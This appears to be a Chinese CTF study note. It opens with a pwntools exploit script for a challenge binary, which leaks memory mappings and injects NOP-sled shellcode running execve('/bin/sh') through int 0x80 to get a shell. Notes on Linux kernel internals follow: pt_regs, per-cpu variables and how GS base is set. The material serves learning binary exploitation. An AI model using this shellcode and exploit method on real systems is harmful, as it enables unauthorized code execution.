由於電腦運行在 ubuntu 20.04，並且不能運行 (錯誤訊息為 `[1]    1585666 illegal hardware instruction (core dumped)  ./test`，代表無效的 instruction，原因可能是編譯 kernel 時沒有加 `CONFIG_IA32_EMULATION`)，因此 exploit 為參考:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

while True:
    r = process('./M', env={"LD_PRELOAD": "./libc-2.27.so"})

    datas = r.recvuntil('Welcome to a no-eeeeeeeeeeeemoji').split(b'\n')
    code = 0
    libc = 0
    stack = 0
    vvar = 0
    vdso = 0
    vsyscall = 0

    for data in datas:
        if not data:
            continue

        if bytes([data[0]]) == b'5' and code == 0: # code
            code = int(data.split(b'-')[0], 16)    
        if bytes([data[0]]) == b'7f' and libc == 0: # libc
            libc = int(data.split(b'-')[0], 16)
        elif data[:3] == b'7ff' and stack == 0: # stack
            stack = int(data.split(b'-')[0], 16)
        elif data[:3] == b'7ff' and vvar == 0: # vvar
            vvar = int(data.split(b'-')[0], 16)
        elif data[:3] == b'7ff' and vdso == 0: # vdso
            vdso = int(data.split(b'-')[0], 16)
        elif data[:4] == b'ffff' and vsyscall == 0: # vsyscall
            vsyscall = int(data.split(b'-')[0], 16)

    target = vdso & (2**32 - 1)
    if target >= 0x3e8000:
        r.close()
        continue
    
    info(f"""\
    ----- lucky -----
    code: {hex(code)}
    libc: {hex(libc)}
    stack: {hex(stack)}
    vvar: {hex(vvar)}
    vdso: {hex(vdso)}
    vsyscall: {hex(vsyscall)}
    """)

    while True:
        r.sendline('b')
        r.recvuntil('map() at @')
        map_addr = int(r.recvline()[:-1], 16)
        if map_addr == target:
            break

    info(f"""\
    ----- next lucky -----
    map_addr: {hex(map_addr)}
    """)

    sc = b'\x90'*0x200 + b'\x0f\x34'
    sc = sc.ljust(0xb60, b'\x90')

    sc += asm(f"""
    mov esp, {map_addr} + 0x100
    push 0x6e69622f
    push 0x68732f 
    mov eax, 0xb
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
    
    mov eax, 1
    int 0x80
    """)
    sc = sc.ljust(0x1000, b'\x90')
    r.sendline('h')
    r.sendafter('gib:\n', sc)
    r.interactive()
    break
```



##### pt_regs

`pt_regs `是用來保存在 syscall 前的 register value，結構如下:

```c
#ifndef __ASSEMBLY__

#ifdef __i386__
/* this struct defines the way the registers are stored on the
   stack during a system call. */

#ifndef __KERNEL__

struct pt_regs {
	long ebx;
	long ecx;
	long edx;
	long esi;
	long edi;
	long ebp;
	long eax;
	int  xds;
	int  xes;
	int  xfs;
	int  xgs;
	long orig_eax;
	long eip;
	int  xcs;
	long eflags;
	long esp;
	int  xss;
};

#endif /* __KERNEL__ */

#else /* __i386__ */

#ifndef __KERNEL__

struct pt_regs {
/*
 * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
 * unless syscall needs a complete, fully filled "struct pt_regs".
 */
	unsigned long r15;
	unsigned long r14;
	unsigned long r13;
	unsigned long r12;
	unsigned long rbp;
	unsigned long rbx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
	unsigned long r11;
	unsigned long r10;
	unsigned long r9;
	unsigned long r8;
	unsigned long rax;
	unsigned long rcx;
	unsigned long rdx;
	unsigned long rsi;
	unsigned long rdi;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it's IRQ number:
 */
	unsigned long orig_rax;
/* Return frame for iretq */
	unsigned long rip;
	unsigned long cs;
	unsigned long eflags;
	unsigned long rsp;
	unsigned long ss;
/* top of stack page */
};

#endif /* __KERNEL__ */
#endif /* !__i386__ */

#endif /* !__ASSEMBLY__ */

#endif /* _UAPI_ASM_X86_PTRACE_H */
```



##### per-cpu

per-cpu static variable 使用 per-cpu macro 來 define:

```c
// include/linux/percpu-defs.h

#define DEFINE_PER_CPU(type, name)					\
	DEFINE_PER_CPU_SECTION(type, name, "")

/*
 * Declaration/definition used for per-CPU variables that must come first in
 * the set of variables.
 */
#define DECLARE_PER_CPU_FIRST(type, name)				\
	DECLARE_PER_CPU_SECTION(type, name, PER_CPU_FIRST_SECTION)

#define DEFINE_PER_CPU_FIRST(type, name)				\
	DEFINE_PER_CPU_SECTION(type, name, PER_CPU_FIRST_SECTION)
```

並且把這些 variable 加到 `section(".data..percpu")`:

```c
// include/asm-generic/vmlinux.lds.h
#define PERCPU_INPUT(cacheline)						\
	__per_cpu_start = .;						\
	*(.data..percpu..first)						\
	. = ALIGN(PAGE_SIZE);						\
	*(.data..percpu..page_aligned)					\
	. = ALIGN(cacheline);						\
	*(.data..percpu..read_mostly)					\
	. = ALIGN(cacheline);						\
	*(.data..percpu)						\
	*(.data..percpu..shared_aligned)				\
	PERCPU_DECRYPTED_SECTION					\
	__per_cpu_end = .;
```

而 `__per_cpu_start` 的 address 為 0，不過有另一個 `pcpu_base_addr` 為 chunk base address:

```bash
root@ubuntu:~# cat /proc/kallsyms | grep __per_cpu_start
0000000000000000 A __per_cpu_start

root@ubuntu:~# cat /proc/kallsyms | grep pcpu_base_addr 
ffffffff956c0328 R pcpu_base_addr
```

kernel 啟動時，會需要為每個 cpu 分配 percpu memory region:

```c
// mm/percpu.c

void __init setup_per_cpu_areas(void)
{
	unsigned long delta;
	unsigned int cpu;
	int rc;

	/*
	 * Always reserve area for module percpu variables.  That's
	 * what the legacy allocator did.
	 */
	rc = pcpu_embed_first_chunk(PERCPU_MODULE_RESERVE,
				    PERCPU_DYNAMIC_RESERVE, PAGE_SIZE, NULL,
				    pcpu_dfl_fc_alloc, pcpu_dfl_fc_free);
	if (rc < 0)
		panic("Failed to initialize percpu areas.");

	delta = (unsigned long)pcpu_base_addr - (unsigned long)__per_cpu_start;
	for_each_possible_cpu(cpu)
		__per_cpu_offset[cpu] = delta + pcpu_unit_offsets[cpu];
}
```

一連串的 cpu operation definition:

```c
// linux/percpu-defs.h

#define __pcpu_size_call_return(stem, variable)				\
({									\
	typeof(variable) pscr_ret__;					\
	__verify_pcpu_ptr(&(variable));					\
	switch(sizeof(variable)) {					\
	case 1: pscr_ret__ = stem##1(variable); break;			\
	case 2: pscr_ret__ = stem##2(variable); break;			\
	case 4: pscr_ret__ = stem##4(variable); break;			\
	case 8: pscr_ret__ = stem##8(variable); break;			\
	default:							\
		__bad_size_call_parameter(); break;			\
	}								\
	pscr_ret__;							\
})
...
    
#define __pcpu_size_call(stem, variable, ...)				\
do {									\
	__verify_pcpu_ptr(&(variable));					\
	switch(sizeof(variable)) {					\
		case 1: stem##1(variable, __VA_ARGS__);break;		\
		case 2: stem##2(variable, __VA_ARGS__);break;		\
		case 4: stem##4(variable, __VA_ARGS__);break;		\
		case 8: stem##8(variable, __VA_ARGS__);break;		\
		default: 						\
			__bad_size_call_parameter();break;		\
	}								\
} while (0)

...

#define raw_cpu_read(pcp)		__pcpu_size_call_return(raw_cpu_read_, pcp)
#define raw_cpu_write(pcp, val)		__pcpu_size_call(raw_cpu_write_, pcp, val)
#define raw_cpu_add(pcp, val)		__pcpu_size_call(raw_cpu_add_, pcp, val)
#define raw_cpu_and(pcp, val)		__pcpu_size_call(raw_cpu_and_, pcp, val)
#define raw_cpu_or(pcp, val)		__pcpu_size_call(raw_cpu_or_, pcp, val)
```

而 `arch/x86/include/asm/percpu.h` 也有定義 percpu 相關的 macro:

```c
#ifdef CONFIG_X86_64
#define __percpu_seg		gs
#else
#define __percpu_seg		fs
#endif
...
```

可以知道 `__percpu_seg` 是  `gs` 內存的值，而 `gs` 是在什麼時候被初始化的:

```asm
; arch/x86/kernel/head_64.S
SYM_DATA(initial_gs,	.quad INIT_PER_CPU_VAR(fixed_percpu_data))
...
	/* Set up %gs.
	 *
	 * The base of %gs always points to fixed_percpu_data. If the
	 * stack protector canary is enabled, it is located at %gs:40.
	 * Note that, on SMP, the boot cpu uses init data section until
	 * the per cpu areas are set up.
	 */
	movl	$MSR_GS_BASE,%ecx
	movl	initial_gs(%rip),%eax
	movl	initial_gs+4(%rip),%edx
	wrmsr
```

`%gs` 永遠指向 `fixed_percpu_data`，而 `MSR_GS_BASE` register 儲存了 `gs` base address。

- `RDMSR`: 將對應的 MSR 讀到 `edx:eax`
- `WRMSR`: 將 `edx:eax` 寫入 ECX 指定的 MSR 中
- `gs`: base address 保存在 `MSR_GS_BASE` 當中

在 `cpu_init()` 時會初始化 per-cpu 的 data (雖然已經有些部分已經在 booting 時初始化完畢):

```c
// arch/x86/kernel/cpu/common.c

/*
 * cpu_init() initializes state that is per-CPU. Some data is already
 * initialized (naturally) in the bootstrap process, such as the GDT
 * and IDT. We reload them nevertheless, this function acts as a
 * 'CPU state barrier', nothing should get across.
 */
void cpu_init(void)
{
	struct tss_struct *tss = this_cpu_ptr(&cpu_tss_rw);
	struct task_struct *cur = current;
	int cpu = raw_smp_processor_id();

	wait_for_master_cpu(cpu);

	ucode_cpu_init(cpu);

#ifdef CONFIG_NUMA
	if (this_cpu_read(numa_node) == 0 &&
	    early_cpu_to_node(cpu) != NUMA_NO_NODE)
		set_numa_node(early_cpu_to_node(cpu));
#endif
	setup_getcpu(cpu);

	pr_debug("Initializing CPU#%d\n", cpu);

	if (IS_ENABLED(CONFIG_X86_64) || cpu_feature_enabled(X86_FEATURE_VME) ||
	    boot_cpu_has(X86_FEATURE_TSC) || boot_cpu_has(X86_FEATURE_DE))
		cr4_clear_bits(X86_CR4_VME|X86_CR4_PVI|X86_CR4_TSD|X86_CR4_DE);

	/*
	 * Initialize the per-CPU GDT with the boot GDT,
	 * and set up the GDT descriptor:
	 */
	switch_to_new_gdt(cpu); // <--- here
	load_current_idt();
    ...
}
...
    
/* ------- */
    
void switch_to_new_gdt(int cpu)
{
	/* Load the original GDT */
	load_direct_gdt(cpu);
	/* Reload the per-cpu base */
	load_percpu_segment(cpu);
}

/* ------- */

void load_percpu_segment(int cpu)
{
#ifdef CONFIG_X86_32
	loadsegment(fs, __KERNEL_PERCPU);
#else
	__loadsegment_simple(gs, 0); 
	wrmsrl(MSR_GS_BASE, cpu_kernelmode_gs_base(cpu));
#endif
}
```

而 `cpu_kernelmode_gs_base(cpu)` 以及相關的 struct，

```c
// arch/x86/include/asm/processor.h

#ifdef CONFIG_X86_64
struct fixed_percpu_data {
	/*
	 * GCC hardcodes the stack canary as %gs:40.  Since the
	 * irq_stack is the object at %gs:0, we reserve the bottom
	 * 48 bytes of the irq stack for the canary.
	 *
	 * Once we are willing to require -mstack-protector-guard-symbol=
	 * support for x86_64 stackprotector, we can get rid of this.
	 */
	char		gs_base[40];
	unsigned long	stack_canary;
};

DECLARE_PER_CPU_FIRST(struct fixed_percpu_data, fixed_percpu_data) __visible;
DECLARE_INIT_PER_CPU(fixed_percpu_data);

static inline unsigned long cpu_kernelmode_gs_base(int cpu)
{
	return (unsigned long)per_cpu(fixed_percpu_data.gs_base, cpu);
}
```

`fixed_percpu_data` 的 value:

```bash
root@ubuntu:~# cat /proc/kallsyms | grep  fixed_percpu_data
0000000000000000 A fixed_percpu_data
```

因此 `MSR_GS_BASE == %gs == fixed_percpu_data.gs_base == fixed_percpu_data == 0`。







- Buildroot